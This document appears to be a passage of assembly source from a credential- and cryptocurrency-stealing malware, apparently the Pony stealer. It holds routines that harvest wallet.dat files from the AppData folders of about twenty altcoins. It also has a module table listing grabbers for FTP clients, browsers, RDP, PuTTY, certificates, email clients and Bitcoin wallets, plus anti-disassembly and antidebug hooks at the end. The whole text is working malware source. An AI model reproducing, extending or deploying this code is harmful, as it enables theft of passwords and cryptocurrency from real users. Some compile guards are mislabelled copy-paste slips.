; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; ProtoShares
; http://invictus-innovations.com/protoshares
; Tested: v0.8.5.0-unk-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_PROTOSHARES

.data
	CProtoSharesWalletFile			db	'wallet.dat',0
	CProtoSharesAppDataDir			db	'\ProtoShares',0

.code

GrabProtoShares proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_PROTOSHARES, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CProtoSharesAppDataDir, offset CProtoSharesWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabProtoShares endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Megacoin
; http://www.megacoin.co.nz
; Tested: v0.8.996.0MEGA-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_MEGACOIN

.data
	CMegacoinWalletFile				db	'wallet.dat',0
	CMegacoinAppDataDir				db	'\Megacoin',0

.code

GrabMegacoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_MEGACOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CMegacoinAppDataDir, offset CMegacoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabMegacoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Quarkcoin
; http://www.quarkcoin.com/
; Tested: v0.8.3.0-g09e437b-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_QUARKCOIN

.data
	CQuarkcoinWalletFile			db	'wallet.dat',0
	CQuarkcoinAppDataDir			db	'\Quarkcoin',0

.code

GrabQuarkcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_QUARKCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CQuarkcoinAppDataDir, offset CQuarkcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabQuarkcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WorldCoin
; http://worldcoin.in
; Tested: v0.6.4.4-ga7433e7-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_WORLDCOIN

.data
	CWorldCoinWalletFile			db	'wallet.dat',0
	CWorldCoinAppDataDir			db	'\Worldcoin',0

.code

GrabWorldcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WORLDCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CWorldCoinAppDataDir, offset CWorldCoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWorldcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Infinitecoin
; http://infinitecoin.com/
; Tested: v1.8.0.0
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_WORLDCOIN

.data
	CInfinitecoinWalletFile			db	'wallet.dat',0
	CInfinitecoinAppDataDir			db	'\Infinitecoin',0

.code

GrabInfinitecoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_INFINITECOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CInfinitecoinAppDataDir, offset CInfinitecoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabInfinitecoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Ixcoin
; http://ixcoin.org/
; Tested: 0.3.24.30-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_IXCOIN

.data
	CIxcoinWalletFile				db	'wallet.dat',0
	CIxcoinAppDataDir				db	'\Ixcoin',0

.code

GrabIxcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_IXCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CIxcoinAppDataDir, offset CIxcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabIxcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Anoncoin
; https://anoncoin.net
; Tested: v0.7.4b-5-gd36ff9d-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_IXCOIN

.data
	CAnoncoinWalletFile				db	'wallet.dat',0
	CAnoncoinAppDataDir				db	'\Anoncoin',0

.code

GrabAnoncoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ANONCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CAnoncoinAppDataDir, offset CAnoncoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabAnoncoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; BBQcoin
; http://bbqcoin.org/
; Tested: v0.6.3.0-unk-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_BBQCOIN

.data
	CBBQcoinWalletFile				db	'wallet.dat',0
	CBBQcoinAppDataDir				db	'\BBQcoin',0

.code

GrabBBQcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BBQCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CBBQcoinAppDataDir, offset CBBQcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBBQcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Digitalcoin
; http://digitalcoin.co/en/
; Tested: v1.0.0.0-g3aaa7ba-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_DIGITALCOIN

.data
	CDigitalcoinWalletFile				db	'wallet.dat',0
	CDigitalcoinAppDataDir				db	'\Digitalcoin',0

.code

GrabDigitalcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_DIGITALCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CDigitalcoinAppDataDir, offset CDigitalcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabDigitalcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; MinCoin
; http://www.min-coin.org/
; Tested: v0.6.5.0-g498f5d1-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_MINCOIN

.data
	CMincoinWalletFile					db	'wallet.dat',0
	CMincoinAppDataDir					db	'\Mincoin',0

.code

GrabMincoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_MINCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CMincoinAppDataDir, offset CMincoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabMincoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; GoldCoin
; http://gldcoin.com/
; Tested: v0.7.1.6-gcf3abdf39d-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_GOLDCOIN

.data
	CGoldcoinWalletFile					db	'wallet.dat',0
	CGoldcoinAppDataDir					db	'\GoldCoin (GLD)',0

.code

GrabGoldcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_GOLDCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CGoldcoinAppDataDir, offset CGoldcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabGoldcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; YaCoin
; http://www.yacoin.org/
; Tested: v0.4.0.0-g2nd-yac-wm-alpha
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_YACOIN

.data
	CYacoinWalletFile					db	'wallet.dat',0
	CYacoinAppDataDir					db	'\Yacoin',0

.code

GrabYacoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_YACOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CYacoinAppDataDir, offset CYacoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabYacoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Zetacoin
; http://www.zeta-coin.org/
; Tested: v0.8.99.0-unk-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_ZETACOIN

.data
	CZetacoinWalletFile					db	'wallet.dat',0
	CZetacoinAppDataDir					db	'\Zetacoin',0

.code

GrabZetacoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ZETACOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CZetacoinAppDataDir, offset CZetacoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabZetacoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FastCoin
; http://www.fastcoin.ca/
; Tested: v0.6.3.0-gc4135e8-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_FASTCOIN

.data
	CFastcoinWalletFile					db	'wallet.dat',0
	CFastcoinAppDataDir					db	'\Fastcoin',0

.code

GrabFastcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FASTCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFastcoinAppDataDir, offset CFastcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFastcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; i0coin
; http://i0coin.bitparking.com/
; Tested: 0.3.25.9-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_I0COIN

.data
	CI0coinWalletFile					db	'wallet.dat',0
	CI0coinAppDataDir					db	'\I0coin',0

.code

GrabI0coin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_I0COIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CI0coinAppDataDir, offset CI0coinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabI0coin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Tagcoin
; http://tagcoin.org/
; Tested: v1.0.2
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_TAGCOIN

.data
	CTagcoinWalletFile					db	'wallet.dat',0
	CTagcoinAppDataDir					db	'\Tagcoin',0

.code

GrabTagcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_TAGCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CTagcoinAppDataDir, offset CTagcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabTagcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Bytecoin
; http://www.bytecoin.biz/
; Tested: v0.8.1.1-gfdc7831-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_BYTECOIN

.data
	CBytecoinWalletFile					db	'wallet.dat',0
	CBytecoinAppDataDir					db	'\Bytecoin',0

.code

GrabBytecoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BYTECOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CBytecoinAppDataDir, offset CBytecoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBytecoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Florincoin
; http://www.florincoin.org
; Tested: v0.6.5.8-unk-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_FLORINCOIN

.data
	CFlorincoinWalletFile					db	'wallet.dat',0
	CFlorincoinAppDataDir					db	'\Florincoin',0

.code

GrabFlorincoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FLORINCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFlorincoinAppDataDir, offset CFlorincoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFlorincoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Phoenixcoin
; http://phoenixcoin.org/
; Tested: v0.6.5.0
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_PHOENIXCOIN

.data
	CPhoenixcoinWalletFile					db	'wallet.dat',0
	CPhoenixcoinAppDataDir					db	'\Phoenixcoin',0

.code

GrabPhoenixcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_PHOENIXCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CPhoenixcoinAppDataDir, offset CPhoenixcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabPhoenixcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Luckycoin
; https://cryptocointalk.com/forum/188-luckycoin-lky/
; Tested: v0.9.9.0
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_LUCKYCOIN

.data
	CLuckycoinWalletFile					db	'wallet.dat',0
	CLuckycoinAppDataDir					db	'\Luckycoin',0

.code

GrabLuckycoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_LUCKYCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CLuckycoinAppDataDir, offset CLuckycoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabLuckycoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CraftCoin
; http://craftcoin.net
; Tested: v1.1.1.2-unk-crc
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_CRAFTCOIN

.data
	CCraftcoinWalletFile					db	'wallet.dat',0
	CCraftcoinAppDataDir					db	'\Craftcoin',0

.code

GrabCraftcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CRAFTCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CCraftcoinAppDataDir, offset CCraftcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabCraftcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; JunkCoin
; http://jkcoin.com/
; Tested: v0.6.3.0-unk-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_JUNKCOIN

.data
	CJunkcoinWalletFile					db	'wallet.dat',0
	CJunkcoinAppDataDir					db	'\Junkcoin',0

.code

GrabJunkcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_JUNKCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CJunkcoinAppDataDir, offset CJunkcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabJunkcoin endp

ENDIF

AddModule macro  Directive, ModuleCallback
	IFDEF	Directive
	dd	offset ModuleCallback
	ENDIF
endm

.data
	; List all available modules
	dwFTPClientList			dd	offset GrabSystemInfo
					AddModule COMPILE_MODULE_FAR, GrabFarManager
					AddModule COMPILE_MODULE_WTC, GrabWTC
					AddModule COMPILE_MODULE_WS_FTP, GrabWS_FTP
					AddModule COMPILE_MODULE_CUTEFTP, GrabCuteFTP
					AddModule COMPILE_MODULE_FLASHFXP, GrabFlashFXP
					AddModule COMPILE_MODULE_FILEZILLA, GrabFileZilla
					AddModule COMPILE_MODULE_FTPCOMMANDER, GrabFTPCommander
					AddModule COMPILE_MODULE_BULLETPROOF, GrabBulletProof
					AddModule COMPILE_MODULE_SMARTFTP, GrabSmartFTP
					AddModule COMPILE_MODULE_TURBOFTP, GrabTurboFTP
					AddModule COMPILE_MODULE_FFFTP, GrabFFFTP
					AddModule COMPILE_MODULE_COFFEECUPFTP, GrabCoffeeCupFTP
					AddModule COMPILE_MODULE_COREFTP, GrabCoreFTP
					AddModule COMPILE_MODULE_FTPEXPLORER, GrabFTPExplorer
					AddModule COMPILE_MODULE_FRIGATEFTP, GrabFrigateFTP
					AddModule COMPILE_MODULE_SECUREFX, GrabSecureFX
					AddModule COMPILE_MODULE_ULTRAFXP, GrabUltraFXP
					AddModule COMPILE_MODULE_FTPRUSH, GrabFTPRush
					AddModule COMPILE_MODULE_WEBSITEPUBLISHER, GrabWebSitePublisher
					AddModule COMPILE_MODULE_BITKINEX, GrabBitKinex
					AddModule COMPILE_MODULE_EXPANDRIVE, GrabExpanDrive
					AddModule COMPILE_MODULE_CLASSICFTP, GrabClassicFTP
					AddModule COMPILE_MODULE_FLING, GrabFling 
					AddModule COMPILE_MODULE_SOFTX, GrabSoftX
					AddModule COMPILE_MODULE_DIRECTORYOPUS, GrabDirectoryOpus
					AddModule COMPILE_MODULE_FREEFTP, GrabFreeFTP
					AddModule COMPILE_MODULE_LEAPFTP, GrabLeapFTP
					AddModule COMPILE_MODULE_WINSCP, GrabWinSCP
					AddModule COMPILE_MODULE_32BITFTP, Grab32BitFTP
					AddModule COMPILE_MODULE_NETDRIVE, GrabNetDrive
					AddModule COMPILE_MODULE_WEBDRIVE, GrabWebDrive
					AddModule COMPILE_MODULE_FTPCONTROL, GrabFTPControl
					AddModule COMPILE_MODULE_OPERA, GrabOpera
					AddModule COMPILE_MODULE_WISEFTP, GrabWiseFTP
					AddModule COMPILE_MODULE_FTPVOYAGER, GrabFTPVoyager
					AddModule COMPILE_MODULE_FIREFOX, GrabFirefox
					AddModule COMPILE_MODULE_FIREFTP, GrabFireFTP
					AddModule COMPILE_MODULE_SEAMONKEY, GrabSeaMonkey
					AddModule COMPILE_MODULE_FLOCK, GrabFlock
					AddModule COMPILE_MODULE_MOZILLA, GrabMozilla
					AddModule COMPILE_MODULE_LEECHFTP, GrabLeechFTP
					AddModule COMPILE_MODULE_ODIN, GrabOdin
					AddModule COMPILE_MODULE_WINFTP, GrabWinFTP
					AddModule COMPILE_MODULE_FTP_SURFER, GrabFTPSurfer
					AddModule COMPILE_MODULE_FTPGETTER, GrabFTPGetter
					AddModule COMPILE_MODULE_ALFTP, GrabALFTP
					AddModule COMPILE_MODULE_IE, GrabIE
					AddModule COMPILE_MODULE_DREAMWEAVER, GrabDreamweaver
					AddModule COMPILE_MODULE_DELUXEFTP, GrabDeluxeFTP
					AddModule COMPILE_MODULE_CHROME, GrabChrome
					AddModule COMPILE_MODULE_CHROMIUM, GrabChromium
					AddModule COMPILE_MODULE_CHROMEPLUS, GrabChromePlus
					AddModule COMPILE_MODULE_BROMIUM, GrabBromium
					AddModule COMPILE_MODULE_NICHROME, GrabNichrome
					AddModule COMPILE_MODULE_COMODODRAGON, GrabComodoDragon
					AddModule COMPILE_MODULE_ROCKMELT, GrabRockMelt
					AddModule COMPILE_MODULE_KMELEON, GrabKMeleon
					AddModule COMPILE_MODULE_EPIC, GrabEpic
					AddModule COMPILE_MODULE_STAFF, GrabStaff
					AddModule COMPILE_MODULE_ACEFTP, GrabAceFTP
					AddModule COMPILE_MODULE_GLOBALDOWNLOADER, GrabGlobalDownloader
					AddModule COMPILE_MODULE_FRESHFTP, GrabFreshFTP
					AddModule COMPILE_MODULE_BLAZEFTP, GrabBlazeFTP
					AddModule COMPILE_MODULE_NETFILE, GrabNetFile
					AddModule COMPILE_MODULE_GOFTP, GrabGoFTP
					AddModule COMPILE_MODULE_3DFTP, Grab3DFTP
					AddModule COMPILE_MODULE_EASYFTP, GrabEasyFTP
					AddModule COMPILE_MODULE_XFTP, GrabXFTP
					AddModule COMPILE_MODULE_RDP, GrabRDP
					AddModule COMPILE_MODULE_FTPNOW, GrabFTPNow
					AddModule COMPILE_MODULE_ROBOFTP, GrabRoboFTP
					AddModule COMPILE_MODULE_CERT, GrabCert
					AddModule COMPILE_MODULE_LINASFTP, GrabLinasFTP
					AddModule COMPILE_MODULE_CYBERDUCK, GrabCyberduck
					AddModule COMPILE_MODULE_PUTTY, GrabPutty
					AddModule COMPILE_MODULE_NOTEPADPP, GrabNotepadPP
					AddModule COMPILE_MODULE_VS_DESIGNER, GrabVSDesigner
					AddModule COMPILE_MODULE_FTPSHELL, GrabFTPShell
					AddModule COMPILE_MODULE_FTPINFO, GrabFTPInfo
					AddModule COMPILE_MODULE_NEXUSFILE, GrabNexusFile
					AddModule COMPILE_MODULE_FS_BROWSER, GrabFSBrowser
					AddModule COMPILE_MODULE_COOLNOVO, GrabCoolNovo
					AddModule COMPILE_MODULE_WINZIP, GrabWinZip
					AddModule COMPILE_MODULE_YANDEXINTERNET, GrabYandexInternet
					AddModule COMPILE_MODULE_MYFTP, GrabMyFTP
					AddModule COMPILE_MODULE_SHERRODFTP, GrabSherrodFTP
					AddModule COMPILE_MODULE_NOVAFTP, GrabNovaFTP
					IFDEF GRAB_EMAIL
					AddModule COMPILE_MODULE_WINDOWS_LIVE_MAIL, GrabWindowsLiveMail
					AddModule COMPILE_MODULE_WINDOWS_MAIL, GrabWindowsMail
					AddModule COMPILE_MODULE_BECKY, GrabBecky
					AddModule COMPILE_MODULE_POCOMAIL, GrabPocomail
					AddModule COMPILE_MODULE_INCREDIMAIL, GrabIncrediMail
					AddModule COMPILE_MODULE_THEBAT, GrabTheBat
					AddModule COMPILE_MODULE_OUTLOOK, GrabOutlook
					AddModule COMPILE_MODULE_THUNDERBIRD, GrabThunderbird
					ENDIF
					AddModule COMPILE_MODULE_FASTTRACK, GrabFastTrack
					AddModule COMPILE_MODULE_BITCOIN, GrabBitcoin
					AddModule COMPILE_MODULE_ELECTRUM, GrabElectrum
					AddModule COMPILE_MODULE_MULTIBIT, GrabMultiBit
					AddModule COMPILE_MODULE_FTPDISK, GrabFTPDisk
					AddModule COMPILE_MODULE_LITECOIN, GrabLitecoin
					AddModule COMPILE_MODULE_NAMECOIN, GrabNamecoin
					AddModule COMPILE_MODULE_TERRACOIN, GrabTerracoin
					AddModule COMPILE_MODULE_BITCOINARMORY, GrabBitcoinArmory
					AddModule COMPILE_MODULE_PPCOIN, GrabPPCoin
					AddModule COMPILE_MODULE_PRIMECOIN, GrabPrimecoin
					AddModule COMPILE_MODULE_FEATHERCOIN, GrabFeathercoin
					AddModule COMPILE_MODULE_NOVACOIN, GrabNovaCoin
					AddModule COMPILE_MODULE_FREICOIN, GrabFreicoin
					AddModule COMPILE_MODULE_DEVCOIN, GrabDevcoin
					AddModule COMPILE_MODULE_FRANKOCOIN, GrabFrankocoin
					AddModule COMPILE_MODULE_PROTOSHARES, GrabProtoShares
					AddModule COMPILE_MODULE_MEGACOIN, GrabMegacoin
					AddModule COMPILE_MODULE_QUARKCOIN, GrabQuarkcoin
					AddModule COMPILE_MODULE_WORLDCOIN, GrabWorldcoin
					AddModule COMPILE_MODULE_INFINITECOIN, GrabInfinitecoin
					AddModule COMPILE_MODULE_IXCOIN, GrabIxcoin
					AddModule COMPILE_MODULE_ANONCOIN, GrabAnoncoin
					AddModule COMPILE_MODULE_BBQCOIN, GrabBBQcoin
					AddModule COMPILE_MODULE_DIGITALCOIN, GrabDigitalcoin
					AddModule COMPILE_MODULE_MINCOIN, GrabMincoin
					AddModule COMPILE_MODULE_GOLDCOIN, GrabGoldcoin
					AddModule COMPILE_MODULE_YACOIN, GrabYacoin
					AddModule COMPILE_MODULE_ZETACOIN, GrabZetacoin
					AddModule COMPILE_MODULE_FASTCOIN, GrabFastcoin
					AddModule COMPILE_MODULE_I0COIN, GrabI0coin
					AddModule COMPILE_MODULE_TAGCOIN, GrabTagcoin
					AddModule COMPILE_MODULE_BYTECOIN, GrabBytecoin
					AddModule COMPILE_MODULE_FLORINCOIN, GrabFlorincoin
					AddModule COMPILE_MODULE_PHOENIXCOIN, GrabPhoenixcoin
					AddModule COMPILE_MODULE_LUCKYCOIN, GrabLuckycoin
					AddModule COMPILE_MODULE_CRAFTCOIN, GrabCraftcoin
					AddModule COMPILE_MODULE_JUNKCOIN, GrabJunkcoin
					dd	0

	dwStreamRecoveryPosition	dd	0
	dwStreamRecoveryStream		dd	0

.code

; Returns TRUE when at least one password was found
GrabFTPPasswords proc uses edi stream
	LOCAL	non_empty: DWORD

	AntiDisasmTrick
	
	mov	non_empty, 0
	mov	edi, offset dwFTPClientList
	
	push	stream
	pop	dwStreamRecoveryStream

	; Antidebug trick
	IFNDEF	ENABLE_DEBUG_MODE
